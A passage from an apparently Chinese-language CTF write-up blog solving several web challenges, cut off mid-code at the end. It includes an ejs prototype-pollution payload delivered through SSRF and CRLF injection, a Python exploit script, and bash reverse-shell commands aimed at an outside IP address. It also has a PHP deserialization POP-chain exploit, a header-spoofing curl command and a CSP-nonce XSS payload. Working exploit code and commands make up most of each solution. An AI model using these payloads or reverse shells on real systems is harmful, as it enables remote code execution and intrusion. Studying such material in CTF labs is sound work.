class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// ä»»ä½• 2xx çŠ¶æ€ç éƒ½è¡¨ç¤ºæˆåŠŸå“åº”ï¼Œä½†è¿™é‡Œåªæ£€æŸ¥ 200ã€‚</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// æ¶ˆè´¹å“åº”æ•°æ®ä»¥é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤„ç»™å‡ºäº†å„ç§ç‰ˆæœ¬ï¼Œå‘ç°å­˜åœ¨ejsæ¨¡æ¿å¼•æ“çš„JavaScriptåŸå‹é“¾æ±¡æŸ“ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211150618302.png" alt="image-20241211150618302" style="zoom:67%;" />

<p>æˆ‘ä»¬å‘ç°&#x2F;copyè·¯ç”±ä¸‹ä¼šå¯¹<code>var ip = req.connection.remoteAddress;</code>ipå€¼è¿›è¡Œåˆ¤æ–­ï¼Œéœ€è¦ä¸º127.0.0.1ï¼Œè¿™ä¸æ˜¯é€šè¿‡XFFç­‰å°±èƒ½æ”¹å˜çš„ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹å®¡ä»£ç ã€‚å‘ç°&#x2F;curlè·¯ç”±å¤„å­˜åœ¨ssrfï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å°±èƒ½é€šè¿‡å¯¹&#x2F;curlè·¯ç”±çš„æ“ä½œï¼Œè®©ä»–ä»¥è‡ªå·±çš„èº«ä»½å»&#x2F;copyè·¯ç”±ä»è€Œè§¦å‘jsåŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿï¼</p>
<p>&#x2F;curlè·¯ç”±ä¸‹å­˜åœ¨<code>http.get</code>æ–¹æ³•ï¼Œå¯ä»¥é€ æˆCRLF Injection</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ æ±¡æŸ“è¯·æ±‚åŒ…ï¼Œé€šè¿‡ejsæ¨¡æ¿å¼•æ“æ±¡æŸ“æ¥å®ç°RCEï¼ï¼</p>
<p>å®Œç¾äº†ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype&quot;:&#123;&quot;constructor.prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194627392.png" alt="image-20241211194627392"></p>
<p>å…³é”®ä»£ç å¦‚ä¸Šï¼Œè¿‡æ»¤äº†<code>__proto__</code>åŒæ—¶è¯´æ˜äº†æ±¡æŸ“çš„å­˜åœ¨ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194704771.png" alt="image-20241211194704771" style="zoom:80%;" />

<p>åŒæ—¶ï¼Œè¿™é‡Œå‘ç°å¦‚æœé”®åé‡Œé¢å­˜åœ¨ <code>.</code> æ‰ä¼šç»§ç»­è°ƒç”¨ <code>_safe.expand</code>ï¼Œç›¸å½“äºé€’å½’mergeçš„æ“ä½œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;__tmp1; global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\&quot;&#x27;); __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ„é€ CRLF</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:3000</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 190</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0120&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\u010d\u010a&#x27;</span>).replace(<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\u017b&#x27;</span>).replace(</span><br><span class="line">    <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\u017d&#x27;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\u0122&#x27;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\u0127&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\u013e&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\u015c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = urllib.parse.quote(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28958/curl?q=&quot;</span></span><br><span class="line">requests.get(url+payload)</span><br></pre></td></tr></table></figure>

<p>å½“æ—¶åœ¨æ±¡æŸ“payloadå¤„å¡äº†å¾ˆä¹…ï¼ï¼ä¸çŸ¥é“ä¸ºå•¥å°±æ˜¯å¼¹ä¸äº†shellï¼Œè¿™ä¸ªå¯ä»¥å¼¹ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ€è·¯å°±æ˜¯åœ¨curlè·¯ç”±ä¸‹é€šè¿‡CRLFæ”»å‡»æ¥æ„é€ æ¶æ„æ•°æ®åŒ…æ¥å®ç°SSRFï¼Œç”¨127.0.0.1å»è®¿é—®&#x2F;copyè·¯ç”±ï¼Œé€ æˆejsæ¨¡æ¿å¼•æ“çš„æ±¡æŸ“ä»è€Œå®ç°RCEï¼</p>
<h2 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezpop"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezpop" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop</h2><p>è™½ç„¶æ˜¯æ–°ç”Ÿèµ›ï¼Œä½†è¿˜å¯ä»¥ã€‚æœ‰ç‚¹å°ç»¼åˆã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é“çš„æ€è·¯å¾ˆç®€å•ï¼Œä¼ å…¥çš„æ˜¯$pdataï¼Œä»–ç›´æ¥åœ¨æºç é‡Œnewäº†ï¼Œåªæœ‰nameæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼ŒåŒæ—¶æˆ‘ä»¬å‘ç°åé¢åˆæœ‰replaceï¼å¯ä»¥è¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸äº†ï¼ï¼é‚£å°±å¾ˆç®€å•äº†ï¼ŒæŠŠ$key,$basedataé€ƒé€¸å‡ºæ¥æ”¹å€¼å°±å¯ä»¥ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:8:&quot;basedata&quot;;N;s:2:&quot;ob&quot;;N;&#125;   53</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç»™å‡ºpayloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pdata</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€ƒé€¸å‡ºkey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data_replace</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span>=<span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$youwant</span>=<span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$nothing</span>=<span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$out</span>-&gt;a=<span class="variable">$youwant</span>;</span><br><span class="line"><span class="variable">$nothing</span>-&gt;t=<span class="variable">$out</span>;</span><br><span class="line"><span class="variable">$nothing</span>-&gt;a=&amp;<span class="variable">$nothing</span>-&gt;b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nothing</span>);</span><br></pre></td></tr></table></figure>

<p>UUCTFä¸­çš„__wakeup()ä¸­ä¹Ÿæœ‰ä¸€ä¸ªunserialize()ï¼Œä¼ å‚basedataï¼Œè¿™é‡Œçš„popé“¾åœ¨ä¸Šé¢ä¹Ÿæœ‰äº†ï¼Œè¦æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯nothingä¸­çš„__wakeup()å’Œ__unserialize()ï¼Œè¿™é‡Œçš„wakeupä¼šæ¸…ç©ºaå±æ€§çš„å€¼ï¼ŒåŒæ—¶æˆ‘ä»¬å‘ç°phpç‰ˆæœ¬åˆä¸ç¬¦åˆé‚£ä¸ªcveï¼Œæˆ‘ä»¬åˆå‘ç°destructä¸­æœ‰å¯¹bå±æ€§çš„èµ‹å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡å¼•ç”¨èµ‹å€¼å°†abè”åˆèµ·æ¥ã€‚è¿™æ ·é—®é¢˜å°±è¿åˆƒè€Œè§£äº†ã€‚</p>
<h2 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h2><p>å…³äºhttpåè®®çš„é¢˜ï¼Œæœ‰ä¸€ç‚¹å°ç›²ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://node1.anna.nssctf.cn:28246/ -H â€œclient-ip:127.0.0.1â€ -H â€œReferer:pornhub.comâ€ -H â€œUser-Agent:Chromeâ€ -H â€œVia:Clash.winâ€</span><br></pre></td></tr></table></figure>



<h2 id="AFCTF-2021-BABY-CSP"><a href="#AFCTF-2021-BABY-CSP" class="headerlink" title="[AFCTF 2021]BABY_CSP"></a>[AFCTF 2021]BABY_CSP</h2><p>å­˜åœ¨CSPç­–ç•¥ï¼Œéœ€è¦ç»•è¿‡ï¼ŒæŠ“åŒ…çœ‹çœ‹</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241213210502761.png" alt="image-20241213210502761"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;none&#x27;;script-src &#x27;nonce-29de6fde0db5686d&#x27;</span><br></pre></td></tr></table></figure>

<p>å…³é”®ç‚¹å¦‚ä¸Šï¼Œå…è®¸nonce-29de6fde0db5686d</p>
<p>é‚£ä¹ˆæ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28378/?school=&lt;script nonce=&quot;29de6fde0db5686d&quot;&gt;alert(flag)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;b4f323f4-020d-4821-bc1a-efd73ce09f89&#125;</span><br></pre></td></tr></table></figure>





<h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]greatphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable 